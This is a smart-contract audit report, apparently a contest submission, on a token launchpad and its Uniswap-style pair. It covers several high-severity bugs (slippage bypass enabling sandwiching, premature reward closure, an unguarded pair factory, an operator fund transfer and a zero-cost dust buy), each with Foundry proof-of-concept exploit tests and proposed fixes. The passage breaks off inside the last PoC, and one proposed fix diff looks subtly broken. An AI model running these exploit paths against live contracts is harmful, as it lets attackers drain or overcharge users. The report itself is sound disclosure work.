### [H-1] Slippage bypass on graduation events when `Launchpad::buy` is called allows attacker to sandwich any user


**Description:** The protocol implements a slippage protection inside the buy function.
```javascript
function buy(BuyData calldata buyData)
        external
        nonReentrant
        onlyBondingActive(buyData.token)
        onlySenderOrOperator(buyData.account, SpotOperatorRoles.LAUNCHPAD_FILL)
        returns (uint256 amountOutBaseActual, uint256 amountInQuote)
    {
        IUniswapV2Pair pair = _assertValidRecipient(buyData.recipient, buyData.token);
        LaunchData memory data = _launches[buyData.token];

        (amountOutBaseActual, data.active) = _checkGraduation(buyData.token, data, buyData.amountOutBase);

        amountInQuote = data.curve.buy(buyData.token, amountOutBaseActual);

        if (data.active && amountInQuote == 0) revert DustAttackInvalid();

@>        if (amountInQuote > buyData.maxAmountInQuote) revert SlippageToleranceExceeded(); 
            ...

```
However, this slippage protection does not account for graduation events.
In graduation events the amount of tokens requested that cannot be supplied by the launchpad is going to be supplied by the swap pool created after the graduation event.
The `amountInQuote` for the slippage check is calculated based on the amount provided by the launchpad. Due to the `amountOutBaseActual` being calculated by the `_checkGraduation`,
`data.curve.buy(buyData.token, amountOutBaseActual);` will provide `amountInQuote` with the amount quote needed only for graduation not the total amount needed.

```javascript
  function _checkGraduation(address token, LaunchData memory data, uint256 amountOutBase)
        internal
        view
        returns (uint256 amountOutBaseActual, bool stillActive)
    {
        uint256 maxBaseForSale = data.curve.bondingSupply(token);

        uint256 baseSold = data.curve.baseSoldFromCurve(token);
        uint256 nextAmountSold = baseSold + amountOutBase;

        // No graduation, can buy full amount of base requested from curve
        if (nextAmountSold < maxBaseForSale) return (amountOutBase, true);

@>        amountOutBaseActual = maxBaseForSale - baseSold;

        return (amountOutBaseActual, false);
    }
``` 
After `_graduation` is called the launchpad creates the pair and tries to swap the remaining amount. The remaining amount is calculated as `buyData.maxAmountInQuote - amountInQuote,`.

```javascript
 function _graduate(
        BuyData calldata buyData,
        IUniswapV2Pair pair,
        LaunchData memory data,
        uint256 amountOutBaseActual,
        uint256 amountInQuote
    ) internal returns (uint256 finalAmountOutBaseActual, uint256 finalAmountInQuote) {
        LaunchToken(buyData.token).unlock();
        _launches[buyData.token].active = false;
        emit BondingLocked(buyData.token, pair, LaunchpadEventNonce.inc());

        uint256 additionalQuote = _createPairAndSwapRemaining({
            token: buyData.token,
            pair: pair,
            data: data,
            remainingBase: buyData.amountOutBase - amountOutBaseActual,
@>            remainingQuote: buyData.maxAmountInQuote - amountInQuote,
            recipient: buyData.recipient
        });

        finalAmountInQuote = amountInQuote + additionalQuote; 
        finalAmountOutBaseActual = additionalQuote > 0 ? buyData.amountOutBase : amountOutBaseActual;
    }
```

Inside `_createPairAndSwapRemaining` function in the case where there is `remainingBase` to trade and `remainingQuote` is greater than 0 but `remainingQuote` is less than `quoteNeeded` the transaction will not revert.

```javascript
    function _createPairAndSwapRemaining(
        address token,
        IUniswapV2Pair pair,
        LaunchData memory data,
        uint256 remainingBase,
        uint256 remainingQuote,
        address recipient
    ) internal returns (uint256 additionalQuoteUsed) {

 @>       if (remainingBase > 0 && remainingQuote > 0) { // @note asta nu da revert si se va umple partial atunci cand va fi un upgrade
            uint256 quoteNeeded =
                uniV2Router.getAmountIn({amountOut: remainingBase, reserveIn: quoteToLock, reserveOut: tokensToLock});

 @>           if (remainingQuote >= quoteNeeded) {
                SwapRemainingData memory d = SwapRemainingData({
                    token: token,
                    quote: data.quote,
                    recipient: recipient,
                    baseAmount: remainingBase,
                    quoteAmount: quoteNeeded
                });

                (, uint256 quoteUsed) = _swapRemaining(d);
                return quoteUsed;
            }
        }

 @>       return 0;
    }

```

Due to the function not reverting an attacker can force any user into a graduation event where it is forced to buy less tokens for the same amount of quoteIn

**Attack Path**
1. user wants to buy 200 tokens for 2000 usdc 
2. attacker front-runs the user increasing the token price and forcing graduation event on the user's transaction ( suppose base left before graduation is 20 ether)
3. because of the price movement now user gets to pay more on a single token -> it gets 20 tokens for 1800 usdc
4. the rest of the tokens are meant to be swapped in the newly created pool but quote needed is higher than the quote provided so it will return 0  (180 < 1800*9)
5. attacker can swap his tokens for profit

**Impact:** Any user is at risk to be sandwiched and pay more for the tokens.

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {LaunchpadTestBase} from "./LaunchpadTestBase.sol";
import {ILaunchpad} from "contracts/launchpad/interfaces/ILaunchpad.sol";
import {console} from "forge-std/Test.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";



contract PoCLaunchpad is LaunchpadTestBase {
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * - factory: ERC1967Factory.sol
     * - launchpad: Launchpad.sol
     * - distributor: Distributor.sol
     * - curve: SimpleBondingCurve.sol
     * - launchpadLPVault: LaunchpadLPVault.sol
     * - quoteToken: Quote token used in Launchpad system
     * - uniV2Router: Uniswap V2 Router used in Launchpad system
     */
    function test_submissionValidity() external {
        address attacker = makeAddr("attacker");
        address user2 = makeAddr("user2");
        deal(address(quoteToken), user, 100_000_000 ether);
        deal(address(quoteToken), user2, 100_000_000 ether);
        deal(address(quoteToken), attacker, 100_000_000_000_000_000_000_000 ether);




        // get amount needed for first user to buy 200 ether in tokens
        uint256 quoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);
        console.log("quote amount needed for user: ", quoteAmountNeededForUser);


        // get initial reserves
        (uint256 quote, uint256 base) = SimpleBondingCurve(address(curve)).getReserves(token);
        console.log("quote reserves:", quote, "base reserves", base);

        // get bonding amount
        uint256 bondingAmount = SimpleBondingCurve(address(curve)).bondingSupply(token);
        console.log("bondingAmount: ", bondingAmount);

        // get quote needed for bonding amount
        uint256 quoteNeeded = launchpad.quoteQuoteForBase(token, bondingAmount, true);
        console.log("quote amount needed: ", quoteNeeded);

        console.log("-> attacker quoteToken balance before : ", ERC20(address(quoteToken)).balanceOf(attacker));
        // attacker front run 
        ILaunchpad.BuyData memory data = ILaunchpad.BuyData({
            account: attacker,
            token: token,
            recipient: attacker,
            amountOutBase: bondingAmount - 1 ether, 
            maxAmountInQuote: quoteNeeded
        });
        vm.startPrank(attacker);
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(data);
        vm.stopPrank();

        console.log("-> attacker quoteToken balance after :  ", ERC20(address(quoteToken)).balanceOf(attacker));


        uint256 tokenBalanceForAttacker = ERC20(token).balanceOf(attacker);

        console.log("token amount attacker: ",tokenBalanceForAttacker);

        // get amount needed for first user to buy 200 ether in tokens after attack 
        uint256 newquoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);
        console.log("new quote amount needed for user:  ", newquoteAmountNeededForUser);

        ILaunchpad.BuyData memory data2 = ILaunchpad.BuyData({
            account: user2,
            token: token,
            recipient: user2,
            amountOutBase: 200 ether,
            maxAmountInQuote: quoteAmountNeededForUser
        });

        uint256 beforeAttack = ERC20(address(quoteToken)).balanceOf(user2);
        console.log("-> user amount of quoteToken before attack: ",ERC20(address(quoteToken)).balanceOf(user2) );

        // user 2 tries to buy token for 200 eth paying more than expected 
        vm.startPrank(user2);
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(data2);
        vm.stopPrank();

        // log results
        console.log("user amount of token after attack", ERC20(token).balanceOf(user2));
        console.log("-> user amount of quoteToken after attack:  ",ERC20(address(quoteToken)).balanceOf(user2) );
        uint256 afterAttack = ERC20(address(quoteToken)).balanceOf(user2);
        beforeAttack -= afterAttack; // calculating the amount user has lost trying to buy the token
        console.log("amount user should have used for the 1 ether he aquiered: ",quoteAmountNeededForUser/200);
        console.log("amount user had actually used for the 1 ether he aquiered: ",beforeAttack);


    }

}
```

**Recommended Mitigation:** 
Revert in the case `remainingQuote >= quoteNeeded`
```diff
 if (remainingQuote >= quoteNeeded) {
                SwapRemainingData memory d = SwapRemainingData({
                    token: token,
                    quote: data.quote,
                    recipient: recipient,
                    baseAmount: remainingBase,
                    quoteAmount: quoteNeeded
                });

                (, uint256 quoteUsed) = _swapRemaining(d);
                return quoteUsed;
            }
+ else revert;
```

### [H-2] Incorrect cehck in `_decreaseFeeShares` leads to premature ending of the reward phase

**Description:** Due to incorrect check inside `_decreaseFeeShares` an attacker can force the closure of the rewards pool by decreasing the `totalFeeShare` to 0 either by simply selling immediately after buying or transferring the tokens to gteRouter. This is possible only in the case the  `GTELaunchpadV2Pair` has already been created. Creating `GTELaunchpadV2Pair` can be done by anyone using `GTELaunchpadV2PairFactory`.

The actual check also prevents closing of the rewards phase after the total shares get to 0 leading to the `totalFeeShare` and `bondingShare` underflow due to unchecked block.

```javascript
 function _decreaseFeeShares(address account, uint256 amount) internal {
        uint256 share = bondingShare[account];
        if (share == 0 || account == address(0)) return;

        amount = amount > share ? share : amount;

        emit FeeShareDecreased(account, amount, _incEventNonce());

        unchecked {
            totalFeeShare -= amount;
            bondingShare[account] -= amount;
        }

@>        if (totalFeeShare == 0 && !unlocked) _endRewards(); // @audit nu se va intampla decat daca in perioada de bonding se tranzactioneaza tot prin GTERouter

        ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
    }
```

**Impact:** The impact varies from loss of users rewards to blocking of sell token in case the `GTELaunchpadV2Pair` is not set and `totalFeeShare` is equal to 0, to increasing `totalFeeShare` and `bondingShare` due to unchecked blocks and underflow inside `_decreaseFeeShares` .

**Proof of Concept:**
The transfer to gteRouter is possible due to a gap in logic inside `_beforeTokenTransfer`. (The reason for using transfer instead of sell is to simplify the Poc)
If the Poc does not work it means the address if the create2 is different.
The concept can be demonstrated without the pair contract by transferring tokens which will revert due to `_endRewards` beeing called without a pair.
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {LaunchpadTestBase} from "./LaunchpadTestBase.sol";
import {ILaunchpad} from "contracts/launchpad/interfaces/ILaunchpad.sol";
import {console} from "forge-std/Test.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";



contract PoCLaunchpad is LaunchpadTestBase {
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * - factory: ERC1967Factory.sol
     * - launchpad: Launchpad.sol
     * - distributor: Distributor.sol
     * - curve: SimpleBondingCurve.sol
     * - launchpadLPVault: LaunchpadLPVault.sol
     * - quoteToken: Quote token used in Launchpad system
     * - uniV2Router: Uniswap V2 Router used in Launchpad system
     */
    function test_submissionValidity() external {

        deal(address(quoteToken), user, 100_000_000_000 ether);
        uint256 quoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);

        // create factory and pair
        GTELaunchpadV2PairFactory launchpadV2PairFactory = new GTELaunchpadV2PairFactory(owner,address(0),address(0),address(0));
        address pair = launchpadV2PairFactory.createPair(token,address(quoteToken)); 
        
        // assign bytecode of the newly created pair to the address of the pair from Launchpad clculation
        bytes memory code = address(pair).code;
        address _pair = 0xd370E4bF0dD427FDA9B0c686748615039376e46D; // @note address of pair created using create2
        vm.etch(_pair, code);

        // set values to pair because etch does not save storage variables so the factory address is set to address(0)
        vm.prank(address(0));  
        GTELaunchpadV2Pair(_pair).initialize(token,address(quoteToken), address(launchpad),address(distributor));
        console.log("rewardsPoolActive: ", GTELaunchpadV2Pair(_pair).rewardsPoolActive() );

        // set buy data
        ILaunchpad.BuyData memory data = ILaunchpad.BuyData({
            account: user,
            token: token,
            recipient: user,
            amountOutBase: 200 ether, 
            maxAmountInQuote: quoteAmountNeededForUser
        });

        // buy token and log results
        console.log("gte router : ", launchpad.gteRouter());
        vm.startPrank(user);
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(data);

        // transfer to gteRouter is easier to implement than launchpad.sell 
        ERC20(token).transfer(launchpad.gteRouter(),200 ether);
        vm.stopPrank();

        console.log("rewardsPoolActive: ", GTELaunchpadV2Pair(_pair).rewardsPoolActive() );

    }

}
```

**Recommended Mitigation:**
```diff
function _decreaseFeeShares(address account, uint256 amount) internal {
        uint256 share = bondingShare[account];
        if (share == 0 || account == address(0)) return;

        amount = amount > share ? share : amount;

        emit FeeShareDecreased(account, amount, _incEventNonce());

        unchecked {
            totalFeeShare -= amount;
            bondingShare[account] -= amount;
        }

-        if (totalFeeShare == 0 && !unlocked) _endRewards(); 
        if (totalFeeShare == 0 && unlocked) _endRewards();
        ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
    }

```




### [H-5] Anyone can call `GTELaunchpadV2PairFactory::CreatePair` leading to `launchpadLp`and `launchpadFeeDistributor` inside the newly created pair be set to address(0) and stop any reward accrual


**Description:** Function `GTELaunchpadV2PairFactory::CreatePair` does not have any access control allowing any user to create a pair. This pair will be used after the graduation event to add rewards on swapp events. On user create the `launchpadLp`and `launchpadFeeDistributor` addresses are set to 0 leading to no actual accrual of rewards.

```javascript
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
        if (amount0Out == 0 && amount1Out == 0) revert("UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT");
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        if (amount0Out >= _reserve0 || amount1Out >= _reserve1) revert("UniswapV2: INSUFFICIENT_LIQUIDITY");

        uint256 balance0;
        uint256 balance1;
        {
            // scope for _token{0,1}, avoids stack too deep errors
            address _token0 = token0;
            address _token1 = token1;
            if (to == _token0 || to == _token1) revert("UniswapV2: INVALID_TO");
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
            if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
            balance0 = IERC20(_token0).balanceOf(address(this));
            balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        if (amount0In == 0 && amount1In == 0) revert("UniswapV2: INSUFFICIENT_INPUT_AMOUNT");

        {
            // scope for reserve{0,1}Adjusted and launchpadFee{0,1}, avoids stack too deep errors
            uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
            uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));

            if (balance0Adjusted.mul(balance1Adjusted) < uint256(_reserve0).mul(_reserve1).mul(1000 ** 2)) {
                revert("UniswapV2: K");
            }

@>            (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
                && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

            _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
        }

        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }
```

**Impact:** Users that contribute to the bonding phase will not get rewarded.

**Proof of Concept:**
If the Poc does not work it means the address if the create2 is different. You can console.log() the actual value of the pair inside `Launchpad::pairFor`
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {LaunchpadTestBase} from "./LaunchpadTestBase.sol";
import {ILaunchpad} from "contracts/launchpad/interfaces/ILaunchpad.sol";
import {console} from "forge-std/Test.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";



contract PoCLaunchpad is LaunchpadTestBase {
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * - factory: ERC1967Factory.sol
     * - launchpad: Launchpad.sol
     * - distributor: Distributor.sol
     * - curve: SimpleBondingCurve.sol
     * - launchpadLPVault: LaunchpadLPVault.sol
     * - quoteToken: Quote token used in Launchpad system
     * - uniV2Router: Uniswap V2 Router used in Launchpad system
     */
    function test_submissionValidity() external {

        deal(address(quoteToken), user, 100_000_000_000 ether);
        deal(address(token), user, 100_000_000_000 ether);


        // 1) Add liquidity (transfer + mint)
        deal(address(token), user,  5_000e18);
        deal(address(quoteToken), user,  5_000e18);

        // create factory and pair
        GTELaunchpadV2PairFactory launchpadV2PairFactory = new GTELaunchpadV2PairFactory(owner,address(0),address(0),address(0));
        address pair = launchpadV2PairFactory.createPair(token,address(quoteToken)); 
        
        // assign bytecode of the newly created pair to the address of the pair from Launchpad clculation
        bytes memory code = address(pair).code;
        address _pair = 0xd370E4bF0dD427FDA9B0c686748615039376e46D;
        vm.etch(_pair, code);

        // address(0) is the factory address after assigning the bytecode to the pair because it does not assign the storage values too
        vm.prank(address(0));  
        GTELaunchpadV2Pair(_pair).initialize(token,address(quoteToken), address(launchpad),address(distributor));

        
        vm.store(_pair,bytes32(uint256(5)),bytes32(uint256(1))); // slot for launchpadLp
        vm.store(_pair,bytes32(uint256(16)),bytes32(uint256(1))); // slot for unlocked
        vm.store(_pair,bytes32(uint256(7)),bytes32(uint256(uint160(address(launchpadV2PairFactory))))); // factory slot neded to not revert due to feeTo() call

        console.log("launchpadLp: ", GTELaunchpadV2Pair(_pair).launchpadLp() );

        vm.startPrank(address(launchpad));
        LaunchToken(token).unlock();
        vm.stopPrank();

        console.log("accruedLaunchpadFee0 before ",GTELaunchpadV2Pair(_pair).accruedLaunchpadFee0());
        console.log("accruedLaunchpadFee0 before ",GTELaunchpadV2Pair(_pair).accruedLaunchpadFee1());

        vm.startPrank(user);
        ERC20(token).transfer(_pair, 5_000e18);
        ERC20(address(quoteToken)).transfer(_pair, 5_000e18);
        GTELaunchpadV2Pair(_pair).mint(user); 

        deal(address(quoteToken), user, 10_000e18);
        ERC20(address(quoteToken)).transfer(_pair, 1.2 ether);
        GTELaunchpadV2Pair(_pair).swap(1 ether, 0, user, "");
        vm.stopPrank();   

        console.log("accruedLaunchpadFee0 after ",GTELaunchpadV2Pair(_pair).accruedLaunchpadFee0());
        console.log("accruedLaunchpadFee0 after ",GTELaunchpadV2Pair(_pair).accruedLaunchpadFee1());
        



    }

}
```

**Recommended Mitigation:** One option is to add access control to `GTELaunchpadV2PairFactory::CreatePair`.
Another option is to allow users to create `GTELaunchpadV2Pair` after the initial pair is created by the launchpad on graduation event.

### [H-6] `Launchpad::_swapRemaining` transfers tokens from operator to account when msg.sender is `SpotOperatorRoles.LAUNCHPAD_FILL` 


***Description*** 
    `Launchpad::_swapRemaining` transfers quote tokens from operator to account instead of transferring from the account to the pool. This could lead to reverts or fund loss in the case of the operator being a smart contract with no payback options. 

```javascript
 function _swapRemaining(SwapRemainingData memory data) internal returns (uint256, uint256) {
        // Transfer the remaining quote from the user
 @>       data.quote.safeTransferFrom(msg.sender, address(this), data.quoteAmount);

        // Prepare swap path
        address[] memory path = new address[](2);
        path[0] = data.quote;
        path[1] = data.token;

        // Approve router to spend remaining quote
        data.quote.safeApprove(address(uniV2Router), data.quoteAmount);

        try uniV2Router.swapTokensForExactTokens(
            data.baseAmount, data.quoteAmount, path, data.recipient, block.timestamp + 1
        ) {
            // Return the tokens received and quote used
            return (data.baseAmount, data.quoteAmount);
        } catch {
           
            // If swap fails, return the additional quote tokens to the user and remove approval
            data.quote.safeApprove(address(uniV2Router), 0);
 @>           data.quote.safeTransfer(msg.sender, data.quoteAmount);
            return (0, 0);
        }
    }
```

***Impact***
    In graduation events if the buyer is an operator the call to `_swapRemaining` will transfer the tokens from the operator amount instead of the actual account.

***Proof of Concept***
    The `uniV2Router.swapTokensForExactTokens` reverts due to configurations in the test set up. The branch covered is the catch one.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {LaunchpadTestBase} from "./LaunchpadTestBase.sol";
import {ILaunchpad} from "contracts/launchpad/interfaces/ILaunchpad.sol";
import {console} from "forge-std/Test.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";
import {SafeTransferLib} from "@solady/utils/SafeTransferLib.sol";

import {IOperatorPanel} from "contracts/utils/interfaces/IOperatorPanel.sol";


contract PoCLaunchpad is LaunchpadTestBase {
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * - factory: ERC1967Factory.sol
     * - launchpad: Launchpad.sol
     * - distributor: Distributor.sol
     * - curve: SimpleBondingCurve.sol
     * - launchpadLPVault: LaunchpadLPVault.sol
     * - quoteToken: Quote token used in Launchpad system
     * - uniV2Router: Uniswap V2 Router used in Launchpad system
     */
    function test_submissionValidity() external {
        address user2_operator = makeAddr("attacker");
        address user2 = makeAddr("user2");
        console.log("operator",address(launchpad.operator()));

        // assign return value for getOperatorRoleApprovals because the operator has no bytecode assigned
        vm.mockCall(
            address(launchpad.operator()),
            abi.encodeWithSelector(
                IOperatorPanel.getOperatorRoleApprovals.selector,
                user2,
                user2_operator
            ),
            abi.encode(5)
        );

        // deal tokens 
        deal(address(quoteToken), user, 100_000_000 ether);
        deal(address(quoteToken), user2, 100_000_000 ether);
        deal(address(quoteToken), user2_operator, 100_000_000_000_000_000_000_000 ether);

        vm.startPrank(user2);
        quoteToken.approve(address(launchpad), type(uint256).max);

        // set operator to SpotOperatorRoles.LAUNCHPAD_FILL
        launchpad.operator().approveOperator(user2,user2_operator,5);
        uint256 roles = launchpad.operator().getOperatorRoleApprovals(user2,user2_operator);
        console.log("roles",roles);
        vm.stopPrank();

        // get bonding amount
        uint256 bondingAmount = SimpleBondingCurve(address(curve)).bondingSupply(token);
        console.log("bondingAmount: ", bondingAmount);

        // get quote needed for bonding amount
        uint256 quoteNeeded = launchpad.quoteQuoteForBase(token, bondingAmount, true);
        console.log("quote amount needed: ", quoteNeeded);

        // get close to graduation
        ILaunchpad.BuyData memory data = ILaunchpad.BuyData({
            account: user2_operator,
            token: token,
            recipient: user2_operator,
            amountOutBase: bondingAmount - 1 ether, 
            maxAmountInQuote: quoteNeeded 
        });
        vm.startPrank(user2_operator);
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(data);
        vm.stopPrank();

        // get quote amount needed 
        uint256 newquoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);
        console.log("new quote amount needed for user:  ", newquoteAmountNeededForUser);

        ILaunchpad.BuyData memory data2 = ILaunchpad.BuyData({
            account: user2,
            token: token,
            recipient: user2,
            amountOutBase: 200 ether,
            maxAmountInQuote: newquoteAmountNeededForUser* 1 ether
        });

        deal(address(quoteToken), user2_operator, 190 ether); // needed for transfer 199 ether

        vm.startPrank(user2_operator);
        quoteToken.approve(address(launchpad), type(uint256).max);
        vm.expectRevert(SafeTransferLib.TransferFromFailed.selector);
        launchpad.buy(data2);
        vm.stopPrank();

    }
}
```

**Recommended Mitigation:** Add account to `SwapRemainingData` struct and use it inside `_swapRemaining`

```diff
struct SwapRemainingData {
        address token;
        address quote;
        address recipient;
        uint256 baseAmount;
        uint256 quoteAmount;
+       address account;
    }

function _swapRemaining(SwapRemainingData memory data) internal returns (uint256, uint256) {
        // Transfer the remaining quote from the user
-       data.quote.safeTransferFrom(msg.sender, address(this), data.quoteAmount);
+       data.quote.safeTransferFrom(msg.sender, address(this), data.account);

        // Prepare swap path
        address[] memory path = new address[](2);
        path[0] = data.quote;
        path[1] = data.token;

        // Approve router to spend remaining quote
        data.quote.safeApprove(address(uniV2Router), data.quoteAmount);

        try uniV2Router.swapTokensForExactTokens(
            data.baseAmount, data.quoteAmount, path, data.recipient, block.timestamp + 1
        ) {
            // Return the tokens received and quote used
            return (data.baseAmount, data.quoteAmount);
        } catch {
           
            // If swap fails, return the additional quote tokens to the user and remove approval
            data.quote.safeApprove(address(uniV2Router), 0);
-           data.quote.safeTransfer(msg.sender, data.quoteAmount);
+           data.quote.safeTransfer(msg.sender, data.account);
            return (0, 0);
        }
    }
```


### [H-7] Graduation event allows to attacker buy dust amount of tokens for 0 quote amount blocking the ending of Rewards phase with minimal consequencies leading to users of the uniswap pool to be overcharged fees on swaps.


**Description:**
The `Launchpad::buy` function implements a security mechanism to stop buyers from buying tokens with 0 quoteTokens amount. This mecanism can be bypassed by graduation events where the check does not revert due to `data.active` being false.
```javascript
 function buy(BuyData calldata buyData)
        external
        nonReentrant
        onlyBondingActive(buyData.token)
        onlySenderOrOperator(buyData.account, SpotOperatorRoles.LAUNCHPAD_FILL)
        returns (uint256 amountOutBaseActual, uint256 amountInQuote)
    {
        IUniswapV2Pair pair = _assertValidRecipient(buyData.recipient, buyData.token);
        LaunchData memory data = _launches[buyData.token];
@>        (amountOutBaseActual, data.active) = _checkGraduation(buyData.token, data, buyData.amountOutBase);

        amountInQuote = data.curve.buy(buyData.token, amountOutBaseActual);

@>        if (data.active && amountInQuote == 0) revert DustAttackInvalid();
        ...
```

This allows users to acquire tokens for 0 quote due to base reserve being calculated as `bonding supply + virtual base`.

```javascript
      function initializeCurve(address token, uint256 totalSupply_, uint256 bondingSupply_) external onlyLaunchpad {
@>        _setReserves(token, VIRTUAL_QUOTE, bondingSupply_ + VIRTUAL_BASE);
        _setSupply(token, totalSupply_, bondingSupply_);

        emit NewTokenLaunched(token, VIRTUAL_BASE, VIRTUAL_QUOTE);
    }
```

Inside `_getQuoteAmount` function the quote needed is calculated based on the formula `(quoteReserve * baseAmount) / baseReserveAfter`. This formula leads to 0 quote amount returns when `quoteReserve * baseAmount < baseReserveAfter`.
```javascript
 function _getQuoteAmount(uint256 baseAmount, uint256 quoteReserve, uint256 baseReserve, bool isBuy)
        internal
        pure
        returns (uint256 quoteAmount)
    {
        uint256 baseReserveAfter = isBuy ? baseReserve - baseAmount : baseReserve + baseAmount;
@>       return (quoteReserve * baseAmount) / baseReserveAfter; 
    }
```
```
  quoteReserve :  49999999999999999999
  baseAmount :  2000000
  baseReserveAfter :  200000000000000000000000000
```
In the test provided the virtual base is actually the amount that is going to be supplied to the swap pool after the graduation event (20% total token supply). This value is big enough for the `_getQuoteAmount` to return 0 values for `baseAmount`= 2000000  and `quoteReserve`= 49999999999999999999 (reached based on quote traded for the token using the bonding curve).

End of rewards phase happens only on token transfers after the bounding period has ended.
```javascript
function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        if (!unlocked && from != launchpad && to != launchpad && to != gteRouter) { 
            revert TransfersDisabledWhileBonding();
        }

        if (!unlocked) {
            if (from != launchpad && to != launchpad && to != gteRouter) revert TransfersDisabledWhileBonding();

            if (from == launchpad && to != launchpad) _increaseFeeShares(to, amount);
            else if (to != launchpad && to != gteRouter) revert TransfersDisabledWhileBonding();
        }

@>        if (from != launchpad) _decreaseFeeShares(from, amount); 
    }

```

```javascript
function _decreaseFeeShares(address account, uint256 amount) internal {
        uint256 share = bondingShare[account];
        if (share == 0 || account == address(0)) return;

        amount = amount > share ? share : amount;

        emit FeeShareDecreased(account, amount, _incEventNonce());

        unchecked {
@>            totalFeeShare -= amount;
            bondingShare[account] -= amount;
        }

        if (totalFeeShare == 0 && !unlocked) _endRewards();

        ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
    }
```

`totalFeeShare` wil never get to 0 if the attacker does not claim the rewards.

```javascript
 function claimRewards(address launchAsset) external returns (uint256 baseAmount, uint256 quoteAmount) {
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

        (baseAmount, quoteAmount) = rs.claim(msg.sender);

@>        _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
    }

    function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
        if (baseAmount > 0) {
            _decreaseTotalPending(base, baseAmount);
 @>           base.safeTransfer(msg.sender, baseAmount);
        }

        if (quoteAmount > 0) {
            _decreaseTotalPending(quote, quoteAmount);
            quote.safeTransfer(msg.sender, quoteAmount);
        }
    }

```


**Impact:** Protocol allows tokens to be bought with 0 quote amount on close to graduation events also accounting the tokens for rewards accrual.
The amount of the rewards claimable for the attacker is too small to count as a financial exploit but it will block the `_endRewards()` after every other user claims his rewards leading to normal users to supply the pool with aditional Launchapd fees on every future swap transaction. The rewards phase can be closed only by the lanchpadToken when totalFeeShares gets to 0.
The rewards acumulated after the swaps will be redeemable by the admin but the users of the pool will be overcharged on every swap. 

**Proof of Concept:** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {LaunchpadTestBase} from "./LaunchpadTestBase.sol";
import {ILaunchpad} from "contracts/launchpad/interfaces/ILaunchpad.sol";
import {console} from "forge-std/Test.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
